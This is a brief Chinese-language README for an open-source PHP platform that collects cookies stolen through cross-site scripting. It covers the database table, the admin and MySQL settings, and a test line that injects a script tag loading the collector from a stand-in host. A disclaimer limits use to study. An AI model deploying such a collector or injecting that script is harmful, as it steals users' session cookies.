# xss
php写的个人研究测试用的  xss cookie 攻击管理平台,开源出来

<img src="https://github.com/keyus/xss/xss_demo.png" />

<h1>仅用于学习交流，禁止用于非法行为，后果自付
</h1>
<p>
数据库里面只有一张表 tu_message 用于存储cookie,自行建行立数据库，导入表
</P>


<p>
config.php  配置后台登陆用户名与密码,与mysql数据库用户名，密码。
index.php   为xs返回的js原码,自行配置js跨站请求的域名
</p>


<h2>本地测试</h2>
<code>
&lt;script src="//xs.com"&gt;&lt;/script&gt;
</code>


